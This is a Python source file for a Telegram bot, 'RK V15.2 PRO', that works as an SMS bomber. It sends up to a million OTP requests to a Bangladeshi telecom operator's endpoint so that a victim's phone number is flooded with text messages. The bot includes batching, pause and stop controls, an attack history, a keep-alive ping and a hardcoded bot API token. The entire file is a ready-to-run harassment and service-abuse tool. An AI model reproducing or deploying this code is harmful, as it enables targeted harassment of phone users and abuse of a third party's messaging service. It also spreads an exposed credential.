import asyncio
import aiohttp
import telebot
import time
import json
import os
import logging
import psutil
from telebot.async_telebot import AsyncTeleBot
from telebot import types
from aiohttp import web 
from datetime import datetime
import pytz

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
WAKEUP_URL = "https://rkbombx.onrender.com" 
DB_FILE = "rk_users_v15.json"
HISTORY_FILE = "rk_history_v15.json"
SYSTEM_STATS_FILE = "rk_system_stats.json"

logging.basicConfig(level=logging.INFO)
bot = AsyncTeleBot(API_TOKEN)
TZ = pytz.timezone('Asia/Dhaka')

# Global Variables
active_attacks = {}  
user_states = {}
authorized_users = {ADMIN_ID}
attack_history = []
global_sms_count = 0

# --- DATA PERSISTENCE ---
def load_all_data():
    global authorized_users, attack_history, global_sms_count
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, "r") as f: authorized_users = set(json.load(f))
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, "r") as f: attack_history = json.load(f)
        if os.path.exists(SYSTEM_STATS_FILE):
            with open(SYSTEM_STATS_FILE, "r") as f:
                stats = json.load(f)
                global_sms_count = stats.get("total_sent", 0)
    except: pass

def save_data():
    try:
        with open(DB_FILE, "w") as f: json.dump(list(authorized_users), f, indent=4)
        with open(HISTORY_FILE, "w") as f: json.dump(attack_history[-100:], f, indent=4)
        with open(SYSTEM_STATS_FILE, "w") as f: json.dump({"total_sent": global_sms_count}, f, indent=4)
    except: pass

# --- HEALTH & ALIVE ---
async def keep_alive():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(WAKEUP_URL) as resp: pass
            except: pass
            await asyncio.sleep(300)

async def start_health_server():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is Active"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, '0.0.0.0', port).start()

# --- UI HELPERS ---
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Attack", "📊 System Info", "📜 Attack History", "📞 Support")
    return markup

def get_control_panel(chat_id, status):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if status == "running" else "▶️ Resume"
    p_callback = f"pau_{chat_id}" if status == "running" else f"res_{chat_id}"
    markup.add(types.InlineKeyboardButton(p_text, callback_data=p_callback),
               types.InlineKeyboardButton("⏹ Stop", callback_data=f"stp_{chat_id}"))
    return markup

# --- ENGINE ---
async def perform_sms(session, number, stats):
    global global_sms_count
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=8) as resp:
            if resp.status == 200:
                stats['ok'] += 1
                global_sms_count += 1
            else: stats['err'] += 1
    except: stats['err'] += 1
    stats['total'] += 1

async def attack_orchestrator(chat_id, message_id, target, limit):
    evt = asyncio.Event()
    evt.set()
    start_time = datetime.now(TZ)
    active_attacks[chat_id] = {'event': evt, 'status': 'running', 'stop': False}
    
    stats = {'ok': 0, 'err': 0, 'total': 0}
    
    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            if active_attacks.get(chat_id, {}).get('stop'): break
            if not evt.is_set(): await evt.wait()
            
            batch = min(30, limit - stats['total'])
            tasks = [perform_sms(session, target, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)
            
            try:
                prog = int((stats['total']/limit)*100)
                bar = "🔹"*(prog//10) + "▫️"*(10-(prog//10))
                elapsed = int((datetime.now(TZ) - start_time).total_seconds())
                
                monitor = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{target}`\n"
                    f"📊 **Progress:** `{prog}%` {bar}\n"
                    f"✅ **Success:** `{stats['ok']}` ]\n"
                    f"❌ **Fail:** `{stats['err']}` ]\n"
                    f"🔢 **Total Sent:** `{stats['total']}/{limit}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🕒 **Started:** `{start_time.strftime('%I:%M:%S %p | %d-%m-%Y')}` ]\n"
                    f"⏳ **Running_Time:** `{elapsed}s` ]\n"
                    f"📡 **STATUS:** `{active_attacks[chat_id]['status'].upper()}` ]\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                await bot.edit_message_text(monitor, chat_id, message_id, 
                                          reply_markup=get_control_panel(chat_id, active_attacks[chat_id]['status']),
                                          parse_mode="Markdown")
            except: pass
            await asyncio.sleep(1)

    active_attacks.pop(chat_id, None)
    save_data()
    await bot.send_message(chat_id, f"🏁 **Attack Finished!**\nTarget: `{target}`\nSuccess: `{stats['ok']}`", reply_markup=get_main_menu())

# --- HANDLERS (RE-ORDERED FOR STABILITY) ---

@bot.message_handler(commands=['start'])
async def start_cmd(m):
    await bot.send_message(m.chat.id, "🔥 **RK V15.2 PRO ONLINE**", reply_markup=get_main_menu())

@bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
async def init_attack(m):
    if m.chat.id not in authorized_users:
        return await bot.reply_to(m, "🚫 Access Denied!")
    user_states[m.chat.id] = {"step": "get_num"}
    await bot.send_message(m.chat.id, "📞 **টার্গেট নম্বর দিন:**", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get("step") == "get_num")
async def process_num(m):
    if len(m.text) == 11 and m.text.isdigit():
        user_states[m.chat.id] = {"step": "get_limit", "target": m.text}
        await bot.send_message(m.chat.id, "🔢 **পরিমাণ দিন (Max 1,000,000):**")
    else:
        await bot.reply_to(m, "❌ ভুল নম্বর! আবার দিন।")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get("step") == "get_limit")
async def process_limit(m):
    if m.text.isdigit():
        limit = min(int(m.text), 1000000)
        target = user_states[m.chat.id]['target']
        user_states.pop(m.chat.id)
        msg = await bot.send_message(m.chat.id, "⚡ Engine Starting...", reply_markup=get_main_menu())
        asyncio.create_task(attack_orchestrator(m.chat.id, msg.message_id, target, limit))
    else:
        await bot.reply_to(m, "⚠️ সংখ্যা দিন!")

@bot.message_handler(func=lambda m: m.text == "📊 System Info")
async def sys_info(m):
    txt = (f"🖥 **System Status**\n━━━━━━━━━━━━━━\n"
           f"⚡ CPU: `{psutil.cpu_percent()}%` | RAM: `{psutil.virtual_memory().percent}%` \n"
           f"📨 Total Sent: `{global_sms_count}`\n"
           f"⏳ Active: `{len(active_attacks)}`")
    await bot.reply_to(m, txt, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda c: True)
async def handle_cb(c):
    cid = c.message.chat.id
    if cid not in active_attacks: return
    if c.data.startswith("pau_"):
        active_attacks[cid]['event'].clear()
        active_attacks[cid]['status'] = "paused"
    elif c.data.startswith("res_"):
        active_attacks[cid]['event'].set()
        active_attacks[cid]['status'] = "running"
    elif c.data.startswith("stp_"):
        active_attacks[cid]['stop'] = True
        active_attacks[cid]['event'].set()
    await bot.answer_callback_query(c.id)

# --- RUN ---
async def main():
    load_all_data()
    await asyncio.gather(start_health_server(), keep_alive(), bot.polling(non_stop=True))

if __name__ == "__main__":
    asyncio.run(main())
